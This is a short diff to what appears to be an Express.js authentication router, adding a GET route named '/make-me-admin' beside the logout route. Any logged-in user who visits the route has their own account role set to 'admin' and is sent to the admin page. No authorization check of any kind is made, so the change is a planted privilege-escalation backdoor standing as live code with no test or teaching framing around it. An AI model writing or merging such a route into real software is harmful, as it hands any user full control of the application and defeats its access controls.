@@ -79,4 +79,13 @@ router.get('/logout', (req, res) => {
   res.redirect('/login');
 });
 
+router.get('/make-me-admin', async (req, res) => {
+  if (!req.session.userId) return res.redirect('/login');
+  const user = await User.findByPk(req.session.userId);
+  if (!user) return res.redirect('/login');
+  user.role = 'admin';
+  await user.save();
+  res.redirect('/admin');
+});
+
 module.exports = router;
